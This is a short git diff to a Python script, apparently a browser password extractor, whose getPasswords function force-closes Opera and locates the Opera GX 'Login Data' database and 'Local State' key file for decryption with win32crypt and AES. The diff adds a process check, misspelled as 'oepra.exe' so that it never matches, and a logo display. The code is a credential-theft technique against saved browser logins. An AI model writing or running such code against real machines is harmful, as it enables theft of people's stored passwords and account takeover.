@@ -5,11 +5,15 @@ import base64
 import win32crypt
 from Crypto.Cipher import AES
 from utils.ansiColors import BOLD_RED, BOLD_GREEN, GRAY, RESET
+from utils.logo import showLogo as showLogoUtils
 
 def getPasswords():
     try:
-        os.system("taskkill /F /IM opera.exe")
-        os.system('cls' if os.name == 'nt' else 'clear')
+        if os.system("tasklist | findstr oepra.exe") == 0:
+            os.system("taskkill /F /IM opera.exe")
+            os.system('cls' if os.name == 'nt' else 'clear')
+
+        showLogoUtils()
 
         dbPath = os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera GX Stable\Login Data"
         keyPath = os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera GX Stable\Local State"
